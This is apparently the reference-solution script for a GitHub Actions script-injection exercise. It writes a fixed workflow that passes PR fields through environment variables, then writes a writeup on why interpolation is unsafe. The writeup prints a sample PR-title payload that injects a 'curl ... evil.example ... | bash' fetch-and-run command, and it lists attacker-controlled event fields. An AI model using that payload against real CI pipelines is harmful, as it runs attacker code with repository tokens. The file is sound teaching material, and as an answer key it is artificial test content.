#!/usr/bin/env bash
# Reference solution for gha-02-02-fix-script-injection in MODE=local.
set -euo pipefail

BASE="${1:-/tmp/gha-02-02}"
HERE="$(cd "$(dirname "$0")" && pwd)"

bash "$HERE/../starter/bootstrap.sh" "$BASE"

# Overwrite the vulnerable workflow with the fixed version.
cat > "$BASE/local/.github/workflows/greet.yml" <<'EOF'
# FIXED — all untrusted github.event.* values are passed via env vars
# and consumed as "$VAR" so the shell treats them as opaque data.
name: greet-contributor

on:
  pull_request:
    types: [opened, edited, synchronize]

permissions:
  contents: read

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Say hello using title
        id: hello
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Thanks for the PR titled: $PR_TITLE"

      - name: Show branch
        id: show_branch
        env:
          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          echo "Head ref is $PR_HEAD_REF"

      - name: Echo body snippet
        id: body
        env:
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          echo "PR body starts with: $PR_BODY"

      - name: Safe metadata
        id: meta
        run: |
          echo "sha=${{ github.sha }} repo=${{ github.repository }}"
EOF

# Also drop the written explanation.
cat > "$BASE/local/EXPLANATION.md" <<'EOF'
# Script injection — writeup

## 1. Exploit payload

A PR with the title:

    foo"; curl -sfL https://evil.example/x.sh | bash; echo "

makes the vulnerable step's shell see:

    echo "Thanks for the PR titled: foo"; curl -sfL https://evil.example/x.sh | bash; echo ""

The runner executes the attacker's script with the ambient `GITHUB_TOKEN`.

## 2. Why GitHub allows it

Expressions `${{ ... }}` are expanded textually by the GitHub control plane
during a *pre-pass*, before the step script is handed to the runner.
By then there is no notion of "shell semantics": the title is substituted
as a raw string into the script. The shell receives the final composed
command and executes it. There is no built-in escape because GitHub does
not know which shell (bash/pwsh/python/custom) will consume the text.

## 3. Two canonical fixes

### 3a. Env var + quoting (preferred default)

```yaml
- name: Say hello using title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR titled: $PR_TITLE"
```

The title becomes an environment variable; the shell treats it as opaque
data. Double quotes prevent word splitting.

### 3b. actions/github-script

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      core.info(`Thanks for the PR titled: ${title}`);
```

The value lives inside a JS object. There is no textual substitution
phase for the shell to misinterpret.

## 4. Other attackable fields

Anything author-controlled under `github.event.*`:

- `pull_request.body`, `pull_request.head.ref`, `pull_request.head.label`
- `issue.title`, `issue.body`, `comment.body`, `review.body`
- `head_commit.message`, `head_commit.author.name`, `head_commit.author.email`
- `workflow_run.head_branch` (when the run was triggered from a fork)

Treatment is identical: never interpolate directly in `run:`; pass through
`env:` and consume as `"$VAR"`, or route through `actions/github-script`.

## 5. Rule of thumb

Only `github.event.*` fields that are SHAs, numeric IDs, or documented
enums are safe to interpolate. Everything else is untrusted input.
EOF

echo
echo "== Solution written. Running validator: =="
MODE=local bash "$HERE/../tests/validate.sh" "$BASE"
